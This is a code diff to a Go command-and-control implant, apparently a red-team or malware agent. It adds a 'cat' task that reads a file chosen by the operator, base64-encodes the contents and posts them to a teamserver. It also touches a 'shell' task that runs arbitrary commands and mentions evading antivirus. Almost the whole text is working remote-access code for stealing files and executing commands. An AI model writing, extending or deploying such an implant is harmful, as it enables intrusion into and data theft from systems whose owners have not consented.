@@ -257,6 +257,43 @@ func main() {
 
 			fmt.Println("[*] Results sent successfully")
 
+		case "cat":
+			fmt.Println("[*] Found 'cat', executing command")
+			fmt.Println("[*] Cat Args: " + strings.Join(command_args, " "))
+			command_id := task["CommandID"].(string)
+			result, err := cat(strings.Join(command_args, " "))
+			if err != nil {
+				fmt.Println("[!] Error executing cat command")
+				fmt.Println(err)
+				return
+			}
+
+			result = b64_encode([]byte(result))
+
+			result_struct := TaskResult{
+				CommandID: command_id,
+				Result:    result,
+			}
+
+			jsonResult, err := json.Marshal(result_struct)
+			if err != nil {
+				fmt.Println("[!] Error marshalling result")
+				fmt.Println(err)
+				return
+			}
+
+			fmt.Println("[*] Sending results to teamserver...")
+			fmt.Println(string(jsonResult))
+
+			_, err = post_results(agent, PostResult, jsonResult, command_id)
+			if err != nil {
+				fmt.Println("[!] Error posting results")
+				fmt.Println(err)
+				return
+			}
+
+			fmt.Println("[*] Results sent successfully")
+
 		case "shell":
 			fmt.Println("[*] Found 'shell', executing command")
 			fmt.Println("[*] Shell Args: " + strings.Join(command_args, " "))
@@ -265,7 +302,7 @@ func main() {
 			if err != nil {
 				fmt.Println("[!] There was an error executing the shell command, could be AV or syntax error")
 				fmt.Println("[!] Regardless, don't kill just yet.")
-				shell_res = "[Agent] There was an error executing " + command + ", check for AV or syntax errors."
+				// shell_res = "[Agent] There was an error executing " + command + ", check for AV or syntax errors."
 			}
 
 			result := b64_encode([]byte(shell_res))
